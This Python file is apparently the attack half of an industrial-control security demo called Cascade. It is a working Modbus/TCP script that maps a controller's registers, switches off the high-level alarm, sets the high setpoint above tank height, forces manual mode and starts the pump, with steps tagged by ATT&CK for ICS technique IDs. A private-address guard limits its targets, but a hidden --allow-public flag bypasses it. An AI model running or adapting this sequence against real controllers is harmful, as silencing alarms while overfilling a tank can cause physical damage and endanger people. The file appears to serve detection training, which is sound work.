"""Attack the emulated controller over real Modbus/TCP. Standard library only.

Run it from a second terminal (or from another laptop on the same network) while Cascade is running:
    python tools/live/attack.py                     # full attack: recon, then the damaging writes
    python tools/live/attack.py recon               # only map the controller (raises 'notice' alerts)
    python tools/live/attack.py --host 192.168.1.20 # attack a Cascade laptop over the network

Steps of the full attack (each one is a real Modbus request):
  1. recon     read holding registers 0..19 one by one             T0861 Point & Tag Identification
  2. silence   coil 1 (alarm enable) = 0                           T0878 Alarm Suppression
  3. setpoint  holding register 1 (high setpoint) = 520 cm (> tank) T0836 Modify Parameter
  4. manual    coil 2 (manual mode) = 1, coil 0 (pump) = 1          T0831 Manipulation of Control
This only works against the emulated controller that Cascade runs. Never point it at real equipment.
"""
import argparse
import socket
import struct
import sys
import time

EXC = {1: "illegal function", 2: "illegal address", 3: "illegal value", 4: "device failure"}


class Client:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=5)
        self.tid = 0

    def req(self, pdu):
        self.tid = (self.tid + 1) % 65536
        self.s.sendall(struct.pack(">HHHB", self.tid, 0, len(pdu) + 1, 1) + pdu)
        head = b""
        while len(head) < 7:
            chunk = self.s.recv(7 - len(head))
            if not chunk:
                raise ConnectionError("the controller closed the connection (isolated?)")
            head += chunk
        n = struct.unpack(">HHHB", head)[2] - 1
        body = b""
        while len(body) < n:
            chunk = self.s.recv(n - len(body))
            if not chunk:
                raise ConnectionError("the controller closed the connection")
            body += chunk
        if body[0] & 0x80:
            return None, EXC.get(body[1], body[1])
        return body, None

    def read_hr(self, addr, qty=1):
        b, e = self.req(struct.pack(">BHH", 3, addr, qty))
        return (None, e) if e else (list(struct.unpack(">" + "H" * qty, b[2:2 + 2 * qty])), None)

    def write_hr(self, addr, v):
        return self.req(struct.pack(">BHH", 6, addr, v))[1]

    def write_coil(self, addr, on):
        return self.req(struct.pack(">BHH", 5, addr, 0xFF00 if on else 0))[1]


def say(msg):
    print(time.strftime("%H:%M:%S"), msg, flush=True)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("step", nargs="?", default="all", choices=["all", "recon", "silence", "setpoint", "manual"])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=5020)
    ap.add_argument("--pause", type=float, default=2.0, help="seconds between steps")
    ap.add_argument("--allow-public", action="store_true", help=argparse.SUPPRESS)
    a = ap.parse_args()
    # safety: only this machine or a private LAN (the demo), never an address on the public internet
    import ipaddress
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(a.host))
    except (OSError, ValueError):
        sys.exit(f"Cannot resolve {a.host}")
    if not (ip.is_loopback or ip.is_private) and not a.allow_public:
        sys.exit(f"Refusing {a.host} ({ip}): this script only targets Cascade's emulated controller on this machine or a private network.")
    try:
        c = Client(a.host, a.port)
    except OSError as e:
        sys.exit(f"Cannot reach the controller at {a.host}:{a.port} ({e}). Is Cascade running?")
    say(f"connected to {a.host}:{a.port}")
    steps = ["recon", "silence", "setpoint", "manual"] if a.step == "all" else [a.step]
    try:
        for st in steps:
            if st == "recon":
                found = []
                for addr in range(20):
                    v, e = c.read_hr(addr)
                    if v:
                        found.append(f"{addr}={v[0]}")
                say("recon: holding registers found " + ", ".join(found))
            elif st == "silence":
                say("silence: switch off the high-level alarm (coil 1)  -> " + (c.write_coil(1, False) or "accepted"))
            elif st == "setpoint":
                say("setpoint: high setpoint (register 1) = 520 cm  -> " + (c.write_hr(1, 520) or "accepted"))
            elif st == "manual":
                say("manual: manual mode on (coil 2) -> " + (c.write_coil(2, True) or "accepted"))
                say("manual: pump on (coil 0)        -> " + (c.write_coil(0, True) or "accepted"))
            time.sleep(a.pause)
        say("done; watching the tank level (Ctrl+C to stop)")
        while True:
            v, e = c.read_hr(0)
            say(f"tank level {v[0]} cm" if v else f"read refused: {e}")
            time.sleep(2)
    except (ConnectionError, OSError) as e:
        say(f"stopped: {e}")
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
